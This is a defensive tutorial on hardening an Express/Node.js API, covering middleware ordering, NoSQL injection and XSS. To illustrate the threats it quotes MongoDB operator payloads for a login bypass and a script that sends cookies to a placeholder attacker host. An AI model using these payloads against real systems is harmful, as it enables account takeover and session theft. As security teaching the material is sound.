# Data Sanitization & The Security Pipeline

Network shields (Helmet and Rate Limiting) are perfectly configured to stop volumetric and browser attacks. But we have two massive vulnerabilities left before this API is truly production-ready.

If a hacker sends a package containing a bomb, and your server opens it without checking, the fortress still falls. We must build a Data Purifier to sanitize the mail, and we must open the CORS Gateway so your React frontend can actually get inside.

---

## 1. The Complete Security Pipeline Setup

Here is how your entire `app.js` file should look, with all imports and middleware ordered sequentially. **Middleware order is critical.**

```javascript
import express from "express";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import cookieParser from "cookie-parser";
import mongoSanitize from "express-mongo-sanitize";
// import xss from 'xss-clean'; // 🚨 Deprecated, see explanation below
import userRouter from "./routes/userRoutes.js";

const app = express();

// 1. THE BROWSER GATEWAY (CORS)
app.use(cors());

// 2. THE NETWORK SHIELDS
// Helmet sets secure HTTP headers
app.use(helmet());

// Rate Limiter prevents brute-force and spam
const limiter = rateLimit({
  max: 100,
  windowMs: 60 * 60 * 1000,
  message: "Too many requests from this IP.",
});
app.use("/api", limiter);

// 3. THE BODY PARSERS
// Reads the JSON body. Limited to 10kb to prevent RAM exhaustion attacks.
app.use(express.json({limit: "10kb"}));

// Reads cookies sent by the browser (required for JWT cookie authentication)
app.use(cookieParser());

// 4. THE DATA PURIFIERS (Must come AFTER express.json!)
// Data sanitization against NoSQL query injection
app.use(mongoSanitize());

// 5. YOUR ROUTERS & ERROR HANDLERS
app.use("/api/users", userRouter);

// Global Error Handler would go here...
```

---

## 2. Vulnerability 1: NoSQL Injection

Imagine your Login Controller does this:

```javascript
User.findOne({email: req.body.email, password: req.body.password});
```

A hacker doesn't know the password. So they send a MongoDB command inside the JSON body:

```json
{
  "email": "admin@startup.com",
  "password": {"$gt": ""}
}
```

Or even worse:

```json
{
  "email": {"$ne": null}
}
```

### The Catastrophe:

Express uses `express.json()` to parse that body. It perfectly converts it into a JavaScript object. When it hands that object to Mongoose, Mongoose reads the password field as: _"Greater Than Nothing"_ (which is mathematically true for everything). Because every string is technically greater than nothing, Mongoose evaluates the password check as true! The database bypasses the password entirely, finds the Admin email, and logs the hacker in.

Since every user in your database has an email that is "not null", MongoDB simply hands over the oldest user in your database (which is almost always the Admin account). The server then tries to run `bcrypt.compare` against "doesn't-matter". It fails, but the hacker just successfully mapped out your database and discovered the Admin's exact email address. Furthermore, if they inject `$ne` into a Password Reset route, they can reset the Admin's password without ever knowing it.

_(99% of the time, the very first user created in a database is the Admin account)._

### The Solution: `express-mongo-sanitize`

- **The Threat:** NoSQL Injection
- **The Target:** Your MongoDB Database

It intercepts `req.body`, `req.query`, and `req.params`. It aggressively searches for any keys that start with a dollar sign (`$`) or contain a dot (`.`). If it finds them, it strips them out or deletes them entirely.

- **Hacker sends:** `{ "email": { "$ne": null } }`
- **mongoSanitize runs:** It sees the `$ne` and destroys it.
- **Your controller receives:** `{ "email": {} }` (The database is safe).

### 🤔 Should you still use `mongoSanitize`? (vs. Mongoose `sanitizeFilter`)

Yes, you can still use `express-mongo-sanitize`, but modern enterprise applications are shifting towards Mongoose's built-in defenses.

Starting in Mongoose 6+, you can globally enable query sanitization:

```javascript
import mongoose from "mongoose";
mongoose.set("sanitizeFilter", true);
```

**The Difference:**

- **`express-mongo-sanitize` (Express Layer):** This is a sledgehammer. It mutates `req.body` globally _before_ your controllers ever see the data. If a user legitimately needs to send a string containing a `$` or `.` in a text field, this package might blindly destroy it.
- **`sanitizeFilter: true` (Database Layer):** This is a scalpel. It leaves `req.body` completely untouched. It only sanitizes the data at the exact moment it is passed into a query filter (like `User.findOne()`).

**Best Practice:** If you are exclusively using Mongoose, enabling `mongoose.set('sanitizeFilter', true)` is generally safer and less destructive than the Express middleware. However, `express-mongo-sanitize` remains a valid, battle-tested defense if you want to block bad data at the network edge.

---

## 3. Vulnerability 2: Cross-Site Scripting (XSS)

- **The Threat:** Cross-Site Scripting (XSS)
- **The Target:** Other Users' Browsers

Imagine you are building a blog platform. A hacker writes a new comment, but instead of writing "Great post!", they write this:

```html
<script>
  // A script that steals the reader's session token and sends it to the hacker
  fetch("https://hacker.com/steal?token=" + document.cookie);
</script>
```

If your server saves that exact text to the database, the next time an innocent user loads the blog post, their browser will see those `<script>` tags, assume it is part of the website's code, and execute it. The innocent user just got hacked.

### What `xss-clean` did:

It intercepted incoming requests and looked for HTML tags and malicious JavaScript. It then escaped them—converting dangerous characters into harmless text symbols (`<` becomes `&lt;`).
Now, when that comment is saved to the database and sent back to the frontend, the browser safely prints the literal text `<script>alert('hacked')</script>` on the screen instead of executing it.

### 🚨 Why you should NOT use `xss-clean` today

While the concept is good, using `xss-clean` as global middleware is no longer considered an enterprise best practice for three major reasons:

1. **The package is dead:** The popular `xss-clean` npm package hasn't been updated in years and is largely considered abandoned. Relying on abandoned security packages is a massive risk.
2. **It destroys legitimate data:** Imagine you are building a coding forum (like StackOverflow). If a user legitimately tries to write a tutorial containing HTML or JavaScript snippets, `xss-clean` will silently mangle and destroy their post before it hits the database.
3. **XSS is a Frontend problem (Output Encoding):** Modern security architecture dictates that the backend database should store exactly what the user typed (raw). The responsibility of preventing XSS falls entirely on the frontend when it _displays_ the data.
   - Modern frontend frameworks like React, Vue, and Angular automatically neutralize XSS by default. If you pass `<script>` into a React component, React safely renders it as pure text on the screen.

**The Modern Solution:** Instead of using global XSS sanitization middleware, modern APIs protect themselves using strict **Input Validation** (like Zod or Joi) to ensure incoming data matches expected formats, and rely on the frontend frameworks to handle output encoding.

---

## 4. The Conclusion

Take a step back and look at your pipeline. This is no longer a toy project. This is a production-ready, Enterprise-grade Node.js pipeline.

Every single request that hits your server must now survive:

1. **The CORS Gateway** (Are you allowed to talk to me?)
2. **The Helmet Armor** (Here are the rules for your browser.)
3. **The IP Rate Limiter** (Are you spamming me?)
4. **The Payload Size Check** (Is your JSON too heavy?)
5. **The NoSQL Purifier** (Are you trying to trick the database?)

Only if a request survives all these physical checks does it finally reach your controllers.
